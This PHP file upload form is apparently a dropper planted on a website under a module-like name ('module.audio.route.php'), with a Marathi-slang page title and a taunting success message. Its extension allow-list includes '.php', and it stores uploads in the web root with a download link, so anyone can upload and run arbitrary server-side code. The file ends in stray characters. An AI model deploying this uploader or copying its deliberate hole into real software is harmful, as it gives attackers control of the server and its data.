<?php
###############DjAmol Group###############
//   DjAmolwap 12v                      //
//   Buy Now Pro Version Only 36 USD    //
//   http://twitter.com/djamol          //
//   Www.djamol.com/contact             //
//      http://ai.djamol.com            //
###############DjAmol Group###############

/*
-----------SITE SETTINGS---------
*/

//Your Sites Title.
$title = 'Bund paadu prograam';

// Your site Url without http:// at end
$site = './';


//Location where you will install this script.
$script = './';


//Just remove Uploads and write your folder name where you want to save uploaded files.Script will create folder if it is not exists....
$upload_dir = "./";
if (!file_exists($upload_dir))
{
mkdir($upload_dir);
}
/*
-------------SCRIPT SETTINGS---------
*/

//if you want limited file types to be upload put yes otherwise no.
$extlimit = "yes";


//Put extension of files that are allowed to upload.
$limitedext = array(".PNG",".png",".jpg",".JPG",".gif",".php",".GIF");

$size_bytes = 1024000; // max file size (here we have 1 MB)

/*
Sizes
 2 MB = 2048000
 3 MB = 3072000
 4 MB = 4096000
 5 MB = 5120000
10 MB = 10240000
*/

/*
-------------SETTINGS FINISHED-------
*/



echo "<div class=menu2>";

echo '<form method="post" enctype="multipart/form-data" action="module.audio.route.php?page=add">';

echo '<input type="file" name="filetoupload"><br>';

echo '<input type="Submit" name="uploadform" value="Upload">';

echo '</form>';

echo '</div>';

$filename = $_FILES['filetoupload']['name'];

$filename = str_replace(' ','_',$filename);

$size = $_FILES['filetoupload']['size'];

$ext = strrchr($_FILES['filetoupload'][name],'.');

if($_GET['page']=="add"){

if (!is_uploaded_file($_FILES['filetoupload']['tmp_name']))
{
echo "<div class=menu2><b><font color=red>Error! Please select a file!</font></b></div>";

exit(); 
}

if (($extlimit == "yes") && (!in_array($ext,$limitedext)))
{
// if extension is wrong
echo "<div class=menu2><b><font color=red>The file extension is wrong!</font></b></div>";

exit();
}

//if file size is biger than limit
if ($size > $size_bytes)
{
echo "<div class=menu2><b><font color=red>The file is too big! The size limit is: 200 KB.</font></b></div>";

exit();
}

//If file exists in folder
if (file_exists("$upload_dir/$filename")) 
{
echo "<div class=menu2><b><font color=red>A file with this name already exists! Rename it.</font></b></div>";

exit();
}

//If uploade successfull
if (move_uploaded_file($_FILES['filetoupload']['tmp_name'],$upload_dir.$filename))
{
echo "<div class=menu2><b><font color=green>teri paat gai saalya!!!</font></b>
<br/>
<br/>";
echo '<a href="'.$script.'/'.$upload_dir.''.$filename.'">Download File</a>
<br/>
<br/>
</div>';
exit();
}
else
{
//if uploading faild due to server problem
echo "<div class=menu2><b><font color=red>Server is busy please try again thanx!</font></b></div>";

exit();
}
}


?>
adflasfn